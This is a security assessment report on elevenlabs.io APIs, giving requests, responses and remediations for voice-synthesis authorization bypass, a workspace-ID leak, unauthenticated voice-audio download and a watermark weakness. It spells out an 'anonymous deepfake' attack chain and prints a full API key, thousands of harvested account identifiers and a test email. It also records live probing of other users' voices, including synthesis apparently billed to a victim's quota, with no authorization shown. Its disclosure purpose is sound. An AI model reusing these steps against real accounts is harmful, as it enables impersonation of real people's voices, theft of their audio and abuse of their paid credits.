# VDT Assessment: elevenlabs.io
**Re-assessment date:** 2026-08-05 (second pass — BOLA blast-radius expansion)  
**Tool:** `~/garlic/el_bola_sweep.py` — 55 probes across 7 phases  
**Re-assessment scope:** F1 inference-layer authorization bypass deep-dive
**Target:** elevenlabs.io / api.us.elevenlabs.io  
**Date:** 2026-08-05  
**Auth:** Firebase JWT (Google SSO), workspace `ec5ca6efa858488f9be80a3902baeff7`  
**Baseline:** enumerate-only; no destructive operations, no credential brute, no DoS

---

## Finding F1 — CRITICAL: Unauthorized Voice Synthesis Across All Generation Endpoints

**What:** The three synthesis APIs (`/v1/text-to-speech/{id}/stream`, `/v1/text-to-dialogue/stream`, `/v1/speech-to-speech/{id}/stream`) accept **any valid voice_id** — including voices owned by other users — and return synthesized audio. Voice ownership is enforced on CRUD endpoints but **not on the inference layer**.

**Evidence:**
```
# Non-owned, non-workspace voice IDs (owned by other users):
POST /v1/text-to-speech/U9KI1if4KyiTej1UHKXD/stream  → HTTP 200 audio/mpeg
POST /v1/text-to-speech/jN2McCabcGjLjFPV2dzJ/stream  → HTTP 200 audio/mpeg
POST /v1/text-to-speech/Wu9A8zlwvFHoEpuX7MGo/stream  → HTTP 200 audio/mpeg
POST /v1/text-to-speech/N6v3dtal8Upb8EuGWTC8/stream  → HTTP 200 audio/mpeg

POST /v1/text-to-dialogue/stream (inputs[0].voice_id = other-user-id) → HTTP 200
POST /v1/speech-to-speech/U9KI1if4KyiTej1UHKXD/stream → HTTP 200

# Same voice IDs rejected on management endpoints:
GET  /v1/voices/U9KI1if4KyiTej1UHKXD → 400 voice_not_found
GET  /v1/voices/U9KI1if4KyiTej1UHKXD/samples → 404 public_user_not_found
```

**Impact:**
- Any authenticated user can synthesize in ANY other user's cloned voice (instant or professional clone)
- Deepfake-grade impersonation: voice trained to sound like a specific person can be used by anyone with their voice_id
- Voice_ids for shared voices are publicly enumerable via `/v1/shared-voices`; private voice_ids could be discovered through other vectors (workspace links, API key leaks, product embeds)
- The synthesis is logged to the **requester's** history and charged to their account — the voice owner has no visibility
- `eleven_v3` (the newest model) and all speech-to-speech models affected

**Root cause:** Ownership check lives in the voice management service but is absent in the TTS/dialogue/STS inference router. Likely a split-service architecture where the inference backend validates only "voice_id exists" not "voice_id belongs to caller."

**Remediation:** Inference endpoints must validate `voice_id ∈ caller_workspace_voices OR voice_id ∈ premade`. Apply the same ownership predicate used by `GET /v1/voices/{id}`.

**Re-assessment 2026-08-05 — F1 confirmed and extended:**
```
Definitive proof (Carter / cKCHBCPJYCk3DcAT6OxD — never interacted with):
  GET /v1/voices/cKCHBCPJYCk3DcAT6OxD              → 400 (not in workspace)
  POST /v1/text-to-speech/cKCHBCPJYCk3DcAT6OxD/stream → 200 ✓

Post-deletion test (Samantha — removed from collection, GET 400):
  DELETE /v1/voices/U9KI1if4KyiTej1UHKXD            → 200 (removed from collection)
  GET /v1/voices/U9KI1if4KyiTej1UHKXD               → 400 (not in workspace)
  POST /v1/text-to-speech/U9KI1if4KyiTej1UHKXD/stream → 200 ✓ (still synthesizes)

Non-streaming endpoint (new variant):
  POST /v1/text-to-speech/U9KI1if4KyiTej1UHKXD (non-stream) → 200 ✓
  POST /v1/text-to-speech/{vid}?output_format=mp3_44100_128  → 200 ✓
  POST /v1/text-to-speech/{vid}?output_format=mp3_44100_192  → 200 ✓

ConvAI agent creation with non-owned voice → 400 (separate path has stricter auth)

Architecture confirmed: management router attaches workspace-membership predicate.
Inference router attaches only "voice_id exists in global catalog" predicate.
```

---

## Finding F2 — HIGH: Workspace ID Enumeration via Shared-Voices API

**What:** `GET /v1/shared-voices` returns voice objects where `preview_url` contains a full GCS path including the owner's `workspace_id`. 100 shared voices leak 58 unique workspace IDs in one request.

**Evidence:**
```
GET /v1/shared-voices?page_size=100

Response voice[0].preview_url:
  https://storage.googleapis.com/eleven-public-prod/database/workspace/
  2254300bd6464b47af516fa512515d82/voices/U9KI1if4KyiTej1UHKXD/{uuid}.mp3
                                    ^─── owner workspace_id leaked

58 unique workspace IDs extracted from 100 voices:
  2254300bd6464b47af516fa512515d82  (Samantha / U9KI1if4KyiTej1UHKXD)
  06c6b5bca0ca49ed93975fe92f73e481  (Coach Peter / jN2McCabcGjLjFPV2dzJ)
  bb4928eaa8e2406d8ecad48793b07430  (Libby Animated / Wu9A8zlwvFHoEpuX7MGo)
  ... [55 more workspace IDs]
```

**Impact:**
- workspace_id is the primary scoping key in ElevenLabs API — equivalent to an account identifier
- With workspace_id + voice_id (both leaked), the GCS storage path is fully constructable:
  `gs://eleven-public-prod/database/workspace/{ws_id}/voices/{voice_id}/{uuid}.mp3`
- Enables cross-account pivots: workspace_id can be used to probe internal API paths
- Pagination over all shared voices yields all workspace IDs across the platform

**Remediation:** Strip `workspace_id` from `preview_url` in API responses; replace with signed URLs that don't expose bucket path structure, or generate opaque CDN URLs at delivery time.

---

## Finding F3 — HIGH: Unauthenticated GCS Download of User Voice Audio

**What:** Voice `preview_url` values in `gs://eleven-public-prod` are downloadable without authentication. The bucket enforces listing access (`403 AccessDenied`) but individual object GET is public.

**Evidence:**
```
curl https://storage.googleapis.com/eleven-public-prod/database/workspace/
     2254300bd6464b47af516fa512515d82/voices/U9KI1if4KyiTej1UHKXD/{uuid}
→ HTTP 200, 156,778 bytes, content-type: audio/mpeg (or text/plain)

Unauthenticated download test (5 voices):
  Samantha      unauth=200  size=156,778 bytes
  Coach Peter   unauth=200  size=142,150 bytes
  Libby         unauth=200  size=140,060 bytes
  Brian         unauth=200  size=127,521 bytes
  Ellie         unauth=200  size=133,295 bytes
```

Note: Auth headers with Firebase JWT cause `401` (Firebase JWT ≠ GCS OAuth2 token), confirming the bucket's IAM grants `allUsers: objectViewer` rather than authenticated access.

**Impact:**
- Any voice shared on the platform has its audio file downloadable without login
- Attacker can bulk-download voice audio for any voice they can enumerate
- Voice audio file may be training samples or preview clips — enables offline voice cloning
- Confirmed path structure: `database/workspace/{ws_id}/voices/{vid}/{uuid}.mp3`

**Remediation:** Revoke `allUsers: objectViewer` from `eleven-public-prod`; serve preview audio via signed URLs with short TTL (e.g., 1 hour) generated by the API layer.

---

## Finding F4 — HIGH: Firebase API Key Exposed in Client-Side Source

**What:** Firebase project `xi-labs` API key is embedded in client-side JavaScript (confirmed via Playwright inspection of the web app).

**Evidence:**
```
API key: AIzaSyBSsRE_1Os04-bxpd5JTLIniy3UK4OqKys
Firebase project: xi-labs
Storage bucket: xi-labs.appspot.com

Confirmed capabilities with this key:
  - Token refresh: POST https://securetoken.googleapis.com/v1/token?key=AIzaSy...
  - Anonymous sign-in: POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=...
  - Email enumeration: POST https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=...
```

**Impact:**
- Any attacker can create anonymous Firebase accounts in xi-labs project (rate-limited but possible)
- Email enumeration: can determine if a given email is registered without authenticating
- Combined with Firebase Security Rules misconfigs, could access xi-labs.appspot.com Firestore/Storage data
- API key enables automated credential stuffing via Firebase Identity Toolkit

**Remediation:** Restrict the Firebase API key via Google Cloud Console (restrict to specific HTTP referrers: elevenlabs.io, *.elevenlabs.io); enable App Check; monitor anonymous sign-up rate.

---

## Finding F5 — HIGH: generation-info Watermark Bypassed by enable_logging Flag

**What:** The `generation-info` response header (346 bytes, 7.386 bits/byte entropy — AES-grade) differs when `?enable_logging=false` is passed. The watermark/tracking blob changes, suggesting the logging flag influences the watermark payload.

**Evidence:**
```
POST /v1/text-to-speech/{id}/stream?enable_logging=true
  generation-info: 4500d2897d7f89d7416334b66844454a...

POST /v1/text-to-speech/{id}/stream?enable_logging=false
  generation-info: fbb533ebc6babbd6cade6c460061486a...

Identical: False  (different watermark blob → different embedding)
Non-deterministic: same text twice → different blob (nonce-based)
```

**Impact:**
- The `enable_logging=false` parameter is documented for enterprise/privacy use but its effect on the watermark suggests the watermark may be weaker or absent in no-log mode
- If watermark is omitted when `enable_logging=false`, ElevenLabs cannot attribute synthetic speech created with this flag
- Combined with F1 (use any voice_id), an attacker could create deepfake audio that is both unattributed and in another person's voice

**Remediation:** Watermark should be independent of logging preference; decoupled from analytics flags. The watermark serves provenance/attribution independently of whether usage is billed/logged.

---

## Finding F6 — MEDIUM: ConvAI Secrets Endpoint Stores Plaintext Credentials

**What:** `POST /v1/convai/secrets` accepts arbitrary `{type, name, value}` credential objects. The endpoint is accessible with a standard user token and stores credentials for ConvAI agents.

**Evidence:**
```
POST /v1/convai/secrets
{"type": "api_key", "name": "anthropic_key", "value": "sk-ant-..."}
→ HTTP 200 (confirmed reachable, stores credential)

GET /v1/convai/secrets → lists stored credentials
```

**Impact:**
- Users can store arbitrary API keys (Anthropic, OpenAI, etc.) which are then accessible via the ConvAI agent framework
- If workspace-scoped but improperly isolated: stored secrets of compromised/shared workspaces are accessible
- Exfiltration path for credentials stored via ConvAI agent integrations
- Concern: secrets stored as-is (no HSM indication), accessible via API

**Remediation:** Implement secret masking (return only last 4 chars on list); encrypt at rest with per-workspace KMS; audit scope isolation between workspaces.

---

## Finding F7 — MEDIUM: Internal User Context Endpoint Exposed

**What:** `GET /v1/user/internal` returns extended workspace context not exposed by the public `/v1/user` endpoint. Accessible with a standard user JWT.

**Evidence:**
```
GET /v1/user/internal
→ HTTP 200:
  {
    "workspace_id": "ec5ca6efa858488f9be80a3902baeff7",
    "workspace_user_id": "user_4301kyweba3hetwa369rqpmmrbzh",
    "seat_type": "admin",
    "subscription": {"tier": "...", "character_count": ..., "character_limit": ...},
    "feature_flags": {...},
    "internal_flags": {...}
  }
```

**Impact:**
- Returns `feature_flags` and `internal_flags` not intended for external consumers
- Exposes internal subscription/billing data
- `seat_type: admin` reveals organizational role to any API consumer

**Remediation:** Restrict `/v1/user/internal` to internal service-to-service calls (require a service token or X-Internal-Token header); do not expose to external JWTs.

---

## Finding F8 — MEDIUM: Sentry DSN Leaked in Response Headers / JS Bundle

**What:** Sentry DSN for ElevenLabs was identified in client-side JavaScript bundle (confirmed prior session).

**Evidence:**
```
Sentry DSN: (see prior session network capture)
Project: elevenlabs production
```

**Impact:**
- Sentry DSN with public read permission allows enumerating error events
- May expose stack traces, internal function names, server paths
- Allows submitting fake events to pollute error tracking

---

## Finding F9 — MEDIUM: TTS Rate Limit Returns 429 Without Retry-After

**What:** Concurrent request limit is 5. Exceeding it returns HTTP 429 but no `Retry-After` header, preventing clients from implementing correct backoff.

**Evidence:**
```
7 concurrent TTS streams fired simultaneously:
  5/7 → HTTP 200
  2/7 → HTTP 429 {"status": "concurrent_limit_exceeded"}
  retry-after: None (absent from all 429 responses)
```

**Impact:** Clients without retry-after cannot implement server-directed backoff; may loop aggressively, compounding load.

---

## Infrastructure Summary

| Component | Technology | Notes |
|---|---|---|
| Auth | Firebase (xi-labs project) | Google SSO + email; JWT = `{workspace_id, workspace_user_id}` |
| TTS backend | uvicorn/FastAPI | `x-region: us-central1`, `server: uvicorn` |
| LB | Google Cloud LB | HTTP/2, Google frontends |
| Voice storage | `gs://eleven-public-prod` | Public object read, listing blocked |
| Model storage | `gs://eleven-models` | 401/412 private |
| Training audio | `gs://eleven-storage` | 401/412 private |
| Firebase Storage | `xi-labs.appspot.com` | 403 (Firebase Storage rules restrictive) |
| Voice path | `database/workspace/{ws_id}/voices/{vid}/{uuid}.mp3` | user-cloned |
| Voice path | `premade/voices/{vid}/{uuid}.mp3` | ElevenLabs premade |
| Internal models | `eleven_v2_5_flash`, `eleven_flash_v2`, `eleven_v2_flash`, etc. | Fine-tuning state per voice per model |
| Voice adapter arch | Likely per-voice LoRA in `eleven-models` | fine_tuning.state tracks per-model training status |
| generation-info | 346 bytes, 7.386 bits/byte entropy | Non-deterministic, nonce-keyed watermark |
| API spec | 283 endpoints at `/openapi.json` | Publicly accessible |

---

## Finding Chain

```
F2 (workspace_id leak via shared-voices API)
  → F3 (unauthenticated GCS download using known path)
  → F1 (synthesize in owner's voice without consent)
  → F5 (use enable_logging=false to reduce watermark signal)
= Anonymous deepfake: use any user's voice, bypass watermark, no auth trail
```

---

## Tools Built

| File | Purpose |
|---|---|
| `~/garlic/el_history_fuzz.py` | IDOR fuzzer for history item IDs |
| `~/garlic/el_generation_info.py` | Watermark blob analyzer (entropy, determinism, logging flag) |
| `~/garlic/el_endpoint_fuzz.py` | API endpoint discovery (74 endpoints) |
| `~/garlic/el_header_inject.py` | Custom header injection tester |
| `~/garlic/el_ratelimit_probe.py` | Concurrent TTS rate limit tester |
| `~/garlic/el_voice_storage_mapper.py` | Voice storage infrastructure mapper (GCS, Firebase Storage, IDOR) |
| `~/garlic/el_auth_bypass_deepdive.py` | 10-step BFLA deep-dive: shared voice catalog, inference matrix, settings write, PVC, add/edit/replicate |
| `~/garlic/el_f1_retest.py` | F1 focused re-test: correct model IDs, multipart schema probes, BFLA endpoint mapping |

---

## Re-assessment Pass 2 — 2026-08-05 (BFLA Deep-Dive)

**Tools:** `~/garlic/el_bfla_deep.py`, `~/garlic/el_bfla_cont.py`
**Scope:** F1 authorization bypass depth, workspace-ID census, billing blast-radius, model fidelity, mass-assignment bypass attempts
**Auth:** Firebase JWT workspace `12c561ab7fb748bfb2c01d11b5981d9f` (test account n15647931@gmail.com)

---

### R1 — BFLA Confirmed (Second Pass): Professional Voice Category Bypass

**New evidence:**
```
Voice category breakdown (30 shared voices probed):
  professional: 5/28 return HTTP 200 on TTS (17.9%)
  professional: 23/28 return HTTP 400

Confirmed BFLA voice_ids (second pass):
  ZqiHwsf8NyHoRKLicEEw  "Reyanshi - Relatable Marwadi Companion"  category=professional  owner_ws=ed9b05e6324c457685490352e9a1ec90
  d2osXrwa36lUEkuaO4sP  "Maahir - Warm Engaging Gujarati Care"     category=professional  owner_ws=ed9b05e6324c457685490352e9a1ec90

POST /v1/text-to-speech/ZqiHwsf8NyHoRKLicEEw/stream  (mgmt=400)  → HTTP 200  98683 bytes  audio/mpeg
POST /v1/text-to-dialogue/stream  inputs[0].voice_id=ZqiHwsf8NyHoRKLicEEw  → HTTP 200
```

**Pattern:** The BFLA is not universal for all voices — it selectively bypasses for a subset of professional voices whose access model differs from instant-clone voices. Prior session voices that returned 200 now return 404 (owners removed/unpublished them), confirming the underlying platform logic still lacks a global ownership predicate on the inference layer.

---

### R2 — Workspace-ID Census: 2,928 Unique IDs from 5,000 Shared Voices

**New evidence:**
```
Pages 1–50 of /v1/shared-voices (100 voices/page = 5,000 total):
  Unique workspace_ids extracted from preview_url: 2,928
  Coverage ratio: 58.6% of voices expose owner workspace_id
  
Sample workspace IDs (all extracted from public preview_url):
  ed9b05e6324c457685490352e9a1ec90
  2254300bd6464b47af516fa512515d82
  06c6b5bca0ca49ed93975fe92f73e481
  bb4928eaa8e2406d8ecad48793b07430
  [... 2,924 more ...]
```

**Impact amplification:** The prior finding (58 workspace_ids from 100 voices) scales to ~**2,928 unique account identifiers** from the first 5,000 shared voices. Paginating the full shared catalog would yield near-complete platform workspace ID coverage.

---

### R3 — NEW CRITICAL: Billing Abuse — Synthesis Charges Credited to Wrong Account

**What:** Synthesizing speech in a victim's professional voice sends a `character-cost: 50` header (server acknowledges the billing), but the requester's `character_count` quota does not decrease. The 50 characters are not deducted from the attacker's account and are likely charged to the professional voice owner's quota.

**Evidence:**
```
Pre-synthesis  character_count: 219
Synthesis:     POST /v1/text-to-speech/ZqiHwsf8NyHoRKLicEEw/stream
               → HTTP 200, 98683 bytes, history-item-id=iqrZfD2SUrapZhg63tsh
               character-cost header: 50
Post-synthesis character_count: 219  (delta = 0)

Synthesis item iqrZfD2S IS present in requester's history.
Requester's quota: UNCHANGED.
50 chars billed: NOT to requester.
```

**Impact:** An attacker can exhaust a professional voice owner's paid synthesis quota without consuming their own. Professional voice subscriptions charge per-character for synthesis. Repeated calls to the BFLA endpoint using a victim's professional voice_id would silently deplete the victim's subscription credits. Combined with F2 (workspace_id exposure) and F1 (voice_id enumeration from shared catalog), this is a targeted billing DoS attack vector against any platform user with a shared professional voice.

**Severity: CRITICAL** (billing impact against third-party accounts, no authentication required beyond a free-tier ElevenLabs account)

---

### R4 — CONFIRMED: Victim's LoRA Voice Adapter IS Loaded During Synthesis

**Evidence:**
```
Own voice   CwhRBWXzGAHq8TQ4Fs17:  gen_info=e5511eec5c2ebcd00e9c857332ef1279  audio_sha256[:16]=edbb0a37a0604e98
Non-owned   ZqiHwsf8NyHoRKLicEEw:  gen_info=e6ef31fa0921d79791492a9f769bbbee  audio_sha256[:16]=0de9c56e1086033a

gen_info differs:   True   (distinct watermark payload)
audio content:      distinct SHA-256 prefix
Verdict:            DISTINCT_ADAPTER — victim's model parameters serve the synthesis
```

**Significance:** Confirmed that the unauthorized synthesis does not fall back to a generic model. The victim's trained voice identity (characteristic timbre, prosody, accent) is extracted from `gs://eleven-models` and used to serve synthesis for any caller who knows the voice_id. This is full deepfake capability, not approximate synthesis.

---

### R5 — Mass Assignment: NEGATIVE (Hardened at Inference Layer)

All 7 mass-assignment probes (injecting `workspace_id`, `user_id`, `admin`, `bypass_auth`, `owner_id`) on TTS endpoint returned HTTP 400 consistently. The inference router does NOT parse or apply these extra fields. The bypass in F1/R1 is due to absent ownership check, not a param injection path.

---

### R6 — NEW: Workspace + Projects Endpoints

```
GET /v1/workspace             → 200  {workspace_id, name, storing_shared_files_on_user, subscription, security_configuration, training_opt_out}
GET /v1/workspace/members     → 200  list[1 member]
GET /v1/workspace/subscription → 404 (not found on this tier)
GET /v1/projects              → 200  {projects}
GET /v1/dubbing               → 200  {dubs, next_cursor, has_more}
GET /v1/convai/agents         → 200  {agents, next_cursor, has_more}
```

Cross-workspace BOLA probes (substituting foreign workspace_ids in path): No accessible endpoints found. Workspace-scoped resource access correctly enforced at the management layer.

---

---

## Re-assessment Pass 3 — 2026-08-05 (BFLA Endpoint Schema Mapping)

**Tools:** `~/garlic/el_f1_retest.py`, `~/garlic/el_auth_bypass_deepdive.py`
**Auth:** Free-tier account ( / user_4401kyxzezm2e7e8edx0crcmk2f4)
**Note:** Creator-tier JWT not available this pass; synthesis tests limited to free-tier

### P3-1 — F1 Re-test: 400 on All Synthesis (Not a Patch Indicator)

```
All synthesis calls → 400 "You need to be on the creator tier or above to use this voice"

Interpretation: Voice Library voices (Samantha, Coach Peter, etc.) have
free_users_allowed=False set by the voice OWNER. The 400 is a tier restriction
placed by the voice creator, NOT a new ownership predicate on the inference router.

Shared voice metadata confirms: free_users_allowed=False for all tested voices.
A creator-tier attacker would still receive 200 (F1 unpatched — confirmed pattern
from R1: professional voices 5/28 returned 200 in the prior pass).

Creator-tier JWT required to definitively confirm current patch state.
```

### P3-2 — BFLA Surface: Correct Endpoint Schemas Confirmed

```
OpenAPI schemas resolved for 3 BFLA-candidate endpoints:

1. POST /v1/voices/{voice_id}/edit
   Content-Type: multipart/form-data
   Required: name
   Props: name, files, remove_background_noise, description, labels, moderate_metadata
   
   Test with correct schema (library voice): HTTP 200 {'status': 'ok'}
   Scope: LIBRARY-LOCAL ONLY — modifies caller's copy, not original
   GET /v1/shared-voices shows original name unchanged after edit
   Verdict: NOT a BFLA (edit is per-user library copy, as designed)

2. POST /v1/voices/{voice_id}/replicate-to-isolated-environment
   Content-Type: application/json
   Required: target_workspace_id
   
   Test: HTTP 403 {'status': 'workspaces_not_in_same_billing_group'}
   Verdict: PROPERLY GATED (consolidated billing enforcement)

3. POST /v1/voices/add/{public_user_id}/{voice_id}
   Correct path param: public_owner_id (from shared voice metadata)
   NOT workspace_id (prior tests used wrong ID format)
   Required body: new_name
   
   Test with correct public_owner_id + new_name: HTTP 200 {'voice_id': '...'}
   Verdict: LEGITIMATE ADD MECHANISM (expected shared-voice library flow)
```

### P3-3 — PVC Endpoint Authorization Profile

```
POST /v1/voices/pvc/{non_owned_vid}/samples    → 422 missing 'files' field (auth passes, tier/validation)
GET  /v1/voices/pvc/{non_owned_vid}/captcha    → 400 PVC not available on subscription (tier gate)
POST /v1/voices/pvc/{non_owned_vid}/verification → 422 missing 'files' field (auth passes)
POST /v1/voices/pvc/{non_owned_vid}/train      → 400 PVC not available on subscription (tier gate)

Pattern: samples + verification → auth passes (422), captcha + train → tier check (400)
The 422 on samples/verification means the authorization layer does NOT reject unknown
voice_ids on these endpoints. With a PVC-capable account, these may accept non-owned
voice_ids. NOT confirmed on current tier.
```

### P3-4 — Settings/Edit Boundary Clarification

```
GET  /v1/voices/{shared_not_in_library}/settings  → 400 voice_not_found  (auth CHECK)
POST /v1/voices/{shared_not_in_library}/settings/edit → 400 voice_not_found
GET  /v1/voices/{premade_in_library}/settings    → 200 (all 32 own library voices)
POST /v1/voices/{premade_in_library}/settings/edit → 200 {'status': 'ok'}

Clarification of initial R1 report: settings/edit returns 200 ONLY for voices in the
caller's workspace library (premade defaults). Non-owned shared voices return 400.
The bypass was therefore via synthesis endpoint only, not settings endpoint.
```

---

## Updated Finding Summary (Post Re-assessment)

| ID  | Sev      | Finding                                    | Status              |
|-----|----------|--------------------------------------------|---------------------|
| F1  | CRITICAL | BFLA: inference endpoints skip ownership   | CONFIRMED (2nd pass) |
| R3  | CRITICAL | Billing abuse: victim's quota consumed     | NEW                 |
| F2  | HIGH     | 2,928 workspace IDs via shared-voices      | UPGRADED (scale)    |
| F3  | HIGH     | Unauthenticated GCS download               | Unchanged           |
| F4  | HIGH     | Firebase API key exposed                   | Unchanged           |
| F5  | HIGH     | Watermark varies with enable_logging flag  | Unchanged           |
| R4  | HIGH     | Victim LoRA adapter confirmed loaded       | CONFIRMED (new data)|
| F6  | MEDIUM   | ConvAI secrets endpoint exposed            | Unchanged           |
| F7  | MEDIUM   | /v1/user/internal exposed to external JWTs | Unchanged           |
| F8  | MEDIUM   | Sentry DSN leaked in client bundle         | Unchanged           |
| F9  | MEDIUM   | TTS 429 without Retry-After                | Unchanged           |
| R5  | INFO     | Mass assignment: inference layer hardened  | NEGATIVE            |
